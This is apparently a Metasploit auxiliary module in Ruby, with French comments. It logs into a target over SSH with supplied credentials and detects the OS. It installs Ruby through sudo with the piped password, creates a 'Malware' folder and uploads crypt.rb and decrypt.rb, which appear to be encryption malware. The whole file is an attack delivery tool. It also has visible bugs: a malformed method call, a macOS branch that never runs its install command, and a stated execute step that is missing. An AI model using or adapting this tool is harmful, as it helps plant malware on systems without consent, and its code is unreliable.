require 'msf/core'
require 'net/ssh'
require 'net/scp'


class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SSH Create and Execute',
      'Description'    => 'Connects to a machine via SSH, creates a file, and executes it',
      'Author'         => 'Your Name',
      'License'        => MSF_LICENSE
    ))

   register_options(
   [
   	Opt::RHOST,
   	Opt::RPORT(22),
   	OptString.new('USERNAME', [true, 'The SSH username']),
      	OptString.new('PASSWORD', [true, 'The SSH password']),
      	
   ])
  end

  def run
  
  username = datastore['USERNAME']
  password = datastore['PASSWORD']
  rport = datastore['RPORT']
  rhost = datastore['RHOST']
  # chemin absolu
  crypt_file_path = File.expand_path("~/Malware/crypt.rb").to_s  #=> "/home/Malware/crypt.rb"
  decrypt_file_path = File.expand_path("~/Malware/decrypt.rb")
    begin
    
  
    print_status("Connecting to #{rhost}:#{rport}...")

     ssh = Net::SSH.start(rhost, username, :password => password, :port => rport)
     print_good("SSH connection to #{datastore['RHOST']}:#{datastore['RPORT']} with #{datastore['USERNAME']} user.")
	
	output = ssh.exec!("uname -a")
	
	if output.include?("Darwin")
		puts "La cible est un système macOS"
	elsif output.include?("Linux")
		puts "La cible est un système LInux"
	else
		puts "Le système d'exploitation de la cible n'a pas pu être déterminé."
		exit
	end
	
     
       unless ssh.exec!("which ruby").include?("ruby")
        # installation de ruby
        print_status("Ruby is not installed. Installing Ruby...")
        
        if output.include?("Darwin")
		puts "La cible est un système macOS"
		command = "brew install ruby"
	elsif output.include("Linux")
		command = "echo #{password} | sudo -S apt-get install ruby -y"
     		output = ssh.exec!(command)
	end
	
        
     	# attente d'installation
     	print_status("Waiting for Ruby to be installed...")
        sleep(10) until ssh.exec!("which ruby").include?("ruby")
        print_good("Ruby is now installed.")
    	end
    	
    	print_status("Creating ~/Malware/ folder..")
    	command = "mkdir /home/#{username}/Malware"
    	output = ssh.exec!(command)
    	print_good("~/Malware/ folder created.")
    	
    	print_status("Uploading crypt.rb, decrypt.rb scripts..")
    	Net::SCP.start(rhost, username, :password => password, :port => rport) do |scp|
    		scp.upload!(crypt_file_path,"/home/#{username}/Malware/crypt.rb")
    		scp.upload!(decrypt_file_path,"/home/#{username}/Malware/decrypt.rb")
    	end
     	
     	print_good("crypt.rb, decrypt.rb scripts uploaded.")
     
	rescue Net::SSH::AuthenticationFailed
		print_error("Echec de l'authentification")
	rescue => e
	print_error("Erreur lors de la session SSH : #{e.class} : #{e.message}")

    end
  end
end

